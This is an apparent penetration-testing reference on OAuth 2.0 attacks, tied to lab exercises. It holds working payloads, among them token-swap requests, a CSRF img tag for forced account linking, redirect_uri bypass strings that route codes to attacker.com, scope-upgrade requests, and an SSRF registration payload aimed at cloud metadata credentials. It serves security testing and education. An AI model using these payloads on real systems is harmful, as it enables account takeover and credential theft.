# OAuth: Attack Technique Reference

OAuth 2.0 delegates authentication and authorization to a third-party provider. The client application redirects the user to the OAuth provider, the user authenticates and grants permissions, and the provider returns an authorization code or access token to the client. Attacks exploit weaknesses in how the client application and OAuth provider validate redirect URIs, enforce state parameters, handle token exchange, and manage scopes. Because OAuth involves multiple parties and redirect-based flows, there are many points where validation gaps enable account takeover, token theft, and privilege escalation.

---

## 1. Detection

### 1A. Identify OAuth Usage

Look for OAuth-related indicators during reconnaissance:

```bash
# Check for OAuth/OIDC login redirects
curl -sk -D- -o /dev/null -L https://target.com/login 2>&1 | grep -i 'location:'

# Look for social login buttons in page source
curl -sk https://target.com/login | grep -iE 'oauth|openid|social|google|facebook|github|login.*with'

# Check for OIDC discovery endpoint on the OAuth provider
curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq .
curl -sk https://oauth-provider.com/.well-known/oauth-authorization-server | jq .
```

**OAuth indicators in HTTP traffic:**
- Authorization redirect: `GET /auth?client_id=...&redirect_uri=...&response_type=code&scope=...&state=...`
- Callback with code: `GET /callback?code=AUTH_CODE&state=STATE_VALUE`
- Callback with token (implicit): `GET /callback#access_token=TOKEN&token_type=bearer`
- Token exchange: `POST /token` with `grant_type=authorization_code&code=...&client_secret=...`

### 1B. Determine the Grant Type

The `response_type` parameter in the authorization request reveals the flow:

| response_type | Grant Type | Token Delivery | Security Level |
|---------------|-----------|---------------|----------------|
| `code` | Authorization Code | Server-to-server exchange | Higher (secret stays server-side) |
| `token` | Implicit | URL fragment in browser | Lower (token exposed in browser) |
| `code token` | Hybrid | Both code and token | Mixed |

### 1C. Map OAuth Parameters

For each OAuth flow, document:

```bash
# Capture the full authorization URL
curl -sk -D- https://target.com/login/oauth 2>&1 | grep -i 'location:' | head -1
```

Record:
- **client_id**: Identifies the client application
- **redirect_uri**: Where the provider sends the user back (primary attack target)
- **scope**: Permissions requested (e.g., `openid profile email`)
- **state**: Anti-CSRF nonce (if absent, CSRF is likely possible)
- **response_type**: `code` or `token`
- **response_mode**: `query`, `fragment`, or `form_post`
- **code_challenge / code_challenge_method**: PKCE parameters (if present, PKCE is enforced)

### 1D. Check for OpenID Connect

OpenID Connect extends OAuth with an ID token (JWT) and standardized endpoints:

```bash
# OIDC discovery
curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq '{
  authorization_endpoint, token_endpoint, userinfo_endpoint,
  registration_endpoint, jwks_uri,
  grant_types_supported, response_types_supported,
  scopes_supported
}'
```

If `registration_endpoint` is present, dynamic client registration may be possible (see technique 2F).

---

## 2. Techniques

### 2A. Implicit Grant Token Theft via Manipulated Credentials

In the implicit grant flow, the OAuth provider sends the access token directly to the client application via a URL fragment. The client then submits the token and user data (email, username) to its own server. If the server does not independently verify that the access token belongs to the submitted user data, an attacker can swap the user details while keeping a valid token.

**Steps:**
1. Complete a legitimate OAuth implicit flow with an attacker account
2. Intercept the POST request where the client submits the token and user data to its own backend
3. Keep the valid `access_token` but change the `email` or `username` to the victim's
4. The server accepts the token (it is valid) and logs the attacker in as the victim (it trusts the submitted user data)

```bash
# Intercept and modify the token submission
curl -sk -X POST https://target.com/authenticate \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "victim@target.com",
    "username": "victim",
    "token": "ATTACKER_VALID_ACCESS_TOKEN"
  }'
```

**Root cause:** The client application does not call the OAuth provider's `/userinfo` endpoint to verify which user the token actually belongs to.

> Lab refs: PS-OAUTH-01

### 2B. Forced OAuth Profile Linking (CSRF on OAuth Attach)

When a user can link their account to an OAuth provider (e.g., "Connect with social media"), the OAuth flow produces an authorization code. If the `state` parameter is missing or not validated, an attacker can initiate the OAuth flow with their own account, intercept the authorization code before it is consumed, and trick the victim into using it -- linking the attacker's OAuth identity to the victim's account.

**Steps:**
1. Attacker initiates the "Link social account" flow on the target application
2. After authenticating with the OAuth provider, intercept the callback URL containing the authorization code: `https://target.com/oauth/callback?code=ATTACKER_CODE`
3. Do NOT follow this redirect -- save the URL
4. Deliver this URL to the victim (via social engineering, email, embedded in an img tag, etc.)
5. When the victim's browser visits the URL, their authenticated session on the target application consumes the code
6. The attacker's OAuth account is now linked to the victim's target account
7. The attacker can now log in to the victim's account via the OAuth "Login with social" flow

```html
<!-- Deliver via CSRF: force victim to visit the attacker's callback URL -->
<img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE" />
```

**Root cause:** Missing or unvalidated `state` parameter in the OAuth authorization request.

**Detection:** Initiate an OAuth flow and check if `state` is present in the authorization URL. If absent, or if removing `state` from the callback still works, the application is vulnerable.

> Lab refs: PS-OAUTH-03

### 2C. redirect_uri Manipulation for Code/Token Theft

The `redirect_uri` parameter specifies where the OAuth provider sends the authorization code or access token. If the provider does not strictly validate this parameter, the attacker can redirect the code/token to their own server.

**Steps:**
1. Capture a legitimate authorization request and note the `redirect_uri`
2. Modify `redirect_uri` to an attacker-controlled URL
3. If the OAuth provider accepts the modified URI, the authorization code or access token is sent to the attacker
4. The attacker uses the stolen code to complete the OAuth flow and gain access to the victim's account

**Bypass techniques when the provider partially validates:**

```
# Exact match bypass - try variations
redirect_uri=https://target.com/callback                     # original
redirect_uri=https://target.com/callback/../other-page       # path traversal
redirect_uri=https://target.com/callback?extra=param         # extra parameters
redirect_uri=https://target.com/callback%23@attacker.com     # fragment injection
redirect_uri=https://target.com.attacker.com/callback        # subdomain confusion
redirect_uri=https://attacker.com?target.com                 # domain in query string

# URL parsing confusion
redirect_uri=https://target.com@attacker.com                 # userinfo field
redirect_uri=https://target.com%40attacker.com               # encoded @
redirect_uri=https://target.com%0d%0a@attacker.com           # CRLF + userinfo

# Localhost/development URIs
redirect_uri=http://localhost:1234/callback                   # dev URI left allowed
redirect_uri=http://localhost.attacker.com/callback           # subdomain trick

# Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
```

```bash
# Test redirect_uri validation by modifying the authorization URL
curl -sk -D- "https://oauth-provider.com/auth?client_id=TARGET_CLIENT_ID&redirect_uri=https://attacker.com/steal&response_type=code&scope=openid" | grep 'location:'
```

If the provider redirects to `attacker.com` with a code, the validation is broken.

### 2D. Code/Token Theft via Open Redirect Proxy

When direct `redirect_uri` manipulation fails because the provider strictly validates the domain, find an open redirect or path traversal on the allowed domain. Use it as a relay to forward the code/token to the attacker.

**Steps:**
1. Confirm `redirect_uri` is strictly validated to `https://target.com/callback`
2. Find an open redirect elsewhere on `target.com` (e.g., `/post/next?path=...`)
3. Use path traversal in `redirect_uri` to reach the open redirect, which then forwards to the attacker

```
# Path traversal to open redirect
redirect_uri=https://target.com/oauth/callback/../post/next?path=https://attacker.com/steal
```

**For implicit flow:** The access token travels in the URL fragment (`#access_token=...`). Fragments are not sent in HTTP requests by default, but they ARE forwarded during same-origin redirects. Chain an open redirect to leak the fragment:

```
redirect_uri=https://target.com/oauth/callback/../redirect?url=https://attacker.com/steal
```

**For authorization code flow:** The code travels in the query string (`?code=...`) and is forwarded through redirects normally. Additionally, the code is leaked in the Referer header if the callback page loads external resources.

> Lab refs: PS-OAUTH-05, PS-OAUTH-06

### 2E. Scope Upgrade Attacks

The OAuth scope defines what permissions the access token grants. If scope validation is weak, the attacker can elevate their privileges beyond what was originally authorized.

**Authorization code flow -- scope manipulation at token exchange:**
```bash
# Original token exchange
curl -sk -X POST https://oauth-provider.com/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT_ID&client_secret=SECRET&redirect_uri=CALLBACK"

# Modified: add elevated scope to the token exchange
curl -sk -X POST https://oauth-provider.com/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT_ID&client_secret=SECRET&redirect_uri=CALLBACK&scope=openid+profile+email+admin"
```

**Implicit flow -- scope manipulation at authorization:**
```
# Original authorization request
https://oauth-provider.com/auth?client_id=X&response_type=token&scope=openid+profile

# Modified: request elevated scope
https://oauth-provider.com/auth?client_id=X&response_type=token&scope=openid+profile+email+admin
```

**Scope upgrade via direct API call:**
After obtaining a valid access token (even with limited scope), try accessing elevated endpoints directly:
```bash
curl -sk https://oauth-provider.com/userinfo \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -d "scope=openid+profile+email+admin"
```

> Lab refs: (scope concepts demonstrated across multiple labs)

### 2F. Unprotected Dynamic Client Registration

OpenID Connect providers may expose a `/registration` endpoint that allows anyone to register a new OAuth client application. If this endpoint has no authentication or rate limiting, an attacker can register a malicious client with a crafted `redirect_uri`.

**Steps:**
1. Check if the OIDC provider supports dynamic registration:
   ```bash
   curl -sk https://oauth-provider.com/.well-known/openid-configuration | jq '.registration_endpoint'
   ```
2. Register a new client with an attacker-controlled `redirect_uri`:
   ```bash
   curl -sk -X POST https://oauth-provider.com/registration \
     -H 'Content-Type: application/json' \
     -d '{
       "redirect_uris": ["https://attacker.com/callback"],
       "application_type": "web",
       "client_name": "Legitimate App"
     }'
   ```
3. The response includes `client_id` and possibly `client_secret`
4. Use the registered client to initiate OAuth flows that redirect tokens to the attacker

**SSRF via registration metadata:**
Registration endpoints may fetch URLs from fields like `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris`, or `policy_uri`. These can be abused for SSRF:

```bash
curl -sk -X POST https://oauth-provider.com/registration \
  -H 'Content-Type: application/json' \
  -d '{
    "redirect_uris": ["https://attacker.com/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# If the server fetches logo_uri, the response may contain AWS metadata
# Check the registered client's logo endpoint or error messages for leaked data
```

> Lab refs: PS-OAUTH-02

### 2G. Unverified User Registration on OAuth Provider

Some OAuth providers allow registration with any email address without verification. An attacker registers an account on the OAuth provider using the victim's email address, then uses "Login with OAuth" on the target application. If the target matches users by email, the attacker gains access to the victim's account.

**Steps:**
1. Register on the OAuth provider (e.g., social media) using the victim's email
2. Navigate to the target application and choose "Login with [OAuth provider]"
3. The OAuth provider returns the victim's email in the user profile
4. The target application matches this email to the existing victim account
5. The attacker is logged in as the victim

**Detection:** Check if the OAuth provider verifies email ownership. Check if the target application verifies that the OAuth account's email is confirmed (look for `email_verified` claim in OIDC).

## 3. OAuth Flow Reference

### 3A. Authorization Code Flow (Server-Side Applications)

```
1. User clicks "Login with OAuth" on client application
   → Browser redirects to:
   GET https://oauth-provider.com/auth
     ?client_id=CLIENT_ID
     &redirect_uri=https://target.com/callback
     &response_type=code
     &scope=openid profile email
     &state=RANDOM_NONCE

2. User authenticates at OAuth provider and grants consent

3. OAuth provider redirects browser back to client:
   GET https://target.com/callback
     ?code=AUTHORIZATION_CODE
     &state=RANDOM_NONCE

4. Client server exchanges code for token (server-to-server, invisible to user):
   POST https://oauth-provider.com/token
   Content-Type: application/x-www-form-urlencoded

   grant_type=authorization_code
   &code=AUTHORIZATION_CODE
   &client_id=CLIENT_ID
   &client_secret=CLIENT_SECRET
   &redirect_uri=https://target.com/callback

5. OAuth provider returns access token (and optionally ID token):
   {"access_token": "TOKEN", "token_type": "bearer", "id_token": "JWT..."}

6. Client fetches user info:
   GET https://oauth-provider.com/userinfo
   Authorization: Bearer TOKEN

7. OAuth provider returns user profile:
   {"sub": "user123", "email": "user@example.com", "name": "User"}
```

**Attack surface:** Steps 1 (redirect_uri, state), 3 (code interception), 4 (scope manipulation), 6-7 (token validation).

### 3B. Implicit Flow (Client-Side Applications)

```
1. Browser redirects to:
   GET https://oauth-provider.com/auth
     ?client_id=CLIENT_ID
     &redirect_uri=https://target.com/callback
     &response_type=token
     &scope=openid profile email
     &state=RANDOM_NONCE

2. User authenticates and grants consent

3. OAuth provider redirects with token in URL fragment:
   GET https://target.com/callback
     #access_token=TOKEN
     &token_type=bearer
     &expires_in=3600
     &state=RANDOM_NONCE

4. Client-side JavaScript extracts token from fragment

5. Client submits token to its own backend or uses it for API calls
```

**Attack surface:** Steps 1 (redirect_uri, state), 3 (fragment leakage via open redirect), 5 (token/identity substitution).

### 3C. PKCE Extension

PKCE (Proof Key for Code Exchange) prevents authorization code interception by binding the code to the client that initiated the flow:

```
1. Client generates random code_verifier and derives code_challenge:
   code_challenge = BASE64URL(SHA256(code_verifier))

2. Authorization request includes code_challenge:
   GET /auth?...&code_challenge=CHALLENGE&code_challenge_method=S256

3. Token exchange includes code_verifier:
   POST /token ... &code_verifier=VERIFIER

4. Server verifies: SHA256(code_verifier) == code_challenge
```

**Testing PKCE:** Remove `code_challenge` from the authorization request. If the flow still works, PKCE is not enforced and code interception attacks (2C, 2D) remain viable.

### 3D. OpenID Connect Differences

OpenID Connect builds on OAuth 2.0 and adds:
- **ID Token:** A JWT containing identity claims, returned alongside the access token
- **UserInfo endpoint:** Standardized endpoint for fetching user profile data
- **Discovery:** `/.well-known/openid-configuration` for automatic configuration
- **Dynamic registration:** `/registration` endpoint for programmatic client setup
- **Standard scopes:** `openid`, `profile`, `email`, `address`, `phone`
